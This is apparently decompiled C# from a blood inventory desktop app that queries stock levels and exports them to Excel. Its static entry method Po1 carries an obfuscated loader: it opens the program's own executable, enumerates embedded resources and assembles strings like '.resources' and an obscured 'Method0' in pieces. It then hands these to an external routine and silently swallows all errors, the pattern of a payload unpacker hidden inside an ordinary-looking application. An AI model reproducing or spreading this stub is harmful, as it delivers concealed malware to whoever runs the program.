using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Jg5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using d1Y;
using g7C;
using k7D;

namespace o8F;

public class Ni3
{
	private object W;

	private q1S.Sg9 q = new q1S.Sg9();

	public object O
	{
		get
		{
			return q.x;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			q.x = objectValue;
		}
	}

	public object f
	{
		get
		{
			return W;
		}
		set
		{
			W = RuntimeHelpers.GetObjectValue(value);
		}
	}

	private void Gi9(object sender, EventArgs e)
	{
		y8F();
		q1S.s3S();
	}

	private void y8F()
	{
		throw new NotImplementedException();
	}

	private void Hz0(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(NewLateBinding.LateGet(O, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		IEnumerable enumerable = "SELECT \r\n                        idinventory,\r\n                        bloodtype,\r\n                        (number_of_blood_added - number_of_request_granted) AS stock\r\n                    FROM\r\n                        inventory\r\n                            INNER JOIN\r\n                        bloodtype ON bloodtype.idbloodtype = inventory.idbloodtype";
		n7G();
		object obj = objectValue;
		NewLateBinding.LateSet(obj, (Type)null, "Connection", new object[1] { f }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj, (Type)null, "CommandType", new object[1] { CommandType.Text }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj, (Type)null, "CommandText", new object[1] { (string)enumerable }, (string[])null, (Type[])null);
		obj = null;
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
		while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
		{
			if (Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(objectValue2, new object[1] { "stock" }, (string[])null), (object)0, false))
			{
				NewLateBinding.LateCall(NewLateBinding.LateGet(O, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[3]
				{
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "idinventory" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null)
				} }, (string[])null, (Type[])null, (bool[])null, true);
			}
			else
			{
				NewLateBinding.LateCall(NewLateBinding.LateGet(O, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[3]
				{
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "idinventory" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "stock" }, (string[])null, (Type[])null, (bool[])null)
				} }, (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		r3T();
	}

	internal static void e4G()
	{
		throw new NotImplementedException();
	}

	private void r3T()
	{
		throw new NotImplementedException();
	}

	private void n7G()
	{
		throw new NotImplementedException();
	}

	private void r4C(object sender, EventArgs e)
	{
		Bz7();
	}

	public void Bz7()
	{
		//IL_0407: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		NewLateBinding.LateSet(objectValue, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		object obj = "C:\\Users\\Jeffrey Banico\\Desktop\\EDP\\BIMS - FINAL PROJECT\\templates\\";
		object obj2 = "C:\\Users\\Jeffrey Banico\\Desktop\\EDP\\BIMS - FINAL PROJECT\\bloodinventory\\";
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "Workbooks", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Open", new object[1] { (obj as string) + "bloodinventory.xlsx" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "Worksheets", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateSet(objectValue3, (Type)null, "Cells", new object[3] { 1, 1, "Blood Inventory" }, (string[])null, (Type[])null);
		int num = 5;
		int num2 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(O, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
		checked
		{
			for (int i = 0; i <= num2; i++)
			{
				object obj3 = objectValue3;
				object[] obj4 = new object[3] { num, 1, null };
				object obj5;
				Array array;
				object obj6 = NewLateBinding.LateGet(O, (Type)null, "Rows", (object[])(obj5 = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }));
				if (((bool[])array)[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((obj5 as object[])[0]), typeof(int));
				}
				obj4[2] = Operators.ConcatenateObject((object)"'", NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "Cells", new object[1] { "inventoryNo" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateSet(obj3, (Type)null, "Cells", obj4, (string[])null, (Type[])null);
				object obj7 = objectValue3;
				object[] obj8 = new object[3] { num, 2, null };
				obj6 = NewLateBinding.LateGet(O, (Type)null, "Rows", (object[])(obj5 = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }));
				if ((array as bool[])[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((obj5 as object[])[0]), typeof(int));
				}
				obj8[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "Cells", new object[1] { "BloodType" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj7, (Type)null, "Cells", obj8, (string[])null, (Type[])null);
				object obj9 = objectValue3;
				object[] obj10 = new object[3] { num, 3, null };
				obj6 = NewLateBinding.LateGet(O, (Type)null, "Rows", (object[])(obj5 = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array = new bool[1] { true }));
				if (((bool[])array)[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((obj5 as object[])[0]), typeof(int));
				}
				obj10[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "Cells", new object[1] { "stock" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj9, (Type)null, "Cells", obj10, (string[])null, (Type[])null);
				num++;
			}
			IComparable comparable = "BloodInventory" + DateTime.Now.ToString("MMddyy-HHmmmss") + ".xlsx";
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(objectValue, (Type)null, "ActiveWindow", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "DisplayGridlines", new object[1] { true }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(objectValue2, (Type)null, "SaveAs", new object[1] { (obj2 as string) + (comparable as string) }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(objectValue, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			objectValue = null;
			objectValue2 = null;
			objectValue3 = null;
			Interaction.MsgBox((object)"File Successfully Exported", (MsgBoxStyle)0, (object)null);
		}
	}

	[STAThread]
	public static void Po1()
	{
		try
		{
			object obj;
			int o;
			do
			{
				obj = new Cf7.Xq4();
				((Cf7.Xq4)obj).O = Sx0.a9();
				o = ((Cf7.Xq4)obj).O;
			}
			while (o != 100);
			((Cf7.Xq4)obj).x = Assembly.LoadFile(Application.get_ExecutablePath());
			((Cf7.Xq4)obj).x = (obj as Cf7.Xq4).x.GetManifestResourceNames();
			((Cf7.Xq4)obj).Y = "mM";
			(obj as Cf7.Xq4).v = ".re" + "sour" + "ces";
			(obj as Cf7.Xq4).a = "rMrertrhrordr0r";
			((Cf7.Xq4)obj).f = 34;
			(obj as Cf7.Xq4).W = 0;
			object obj2 = new List<int>
			{
				Capacity = 15
			};
			int num = 0;
			do
			{
				((List<int>)obj2).Add(((Cf7.Xq4)obj).O % checked(num + 2));
				num = checked(num + 1);
			}
			while (num <= 10);
			if ((obj2 as List<int>)[5] == 2)
			{
				f9H.Bs8((Cf7.Xq4)obj, (obj2 as List<int>)[7], "OpgOpeKlI", bool_0: false);
				if ((obj2 as List<int>)[5] > 0)
				{
					(obj2 as List<int>)[5] = checked(((List<int>)obj2)[5] * 25 * 25);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
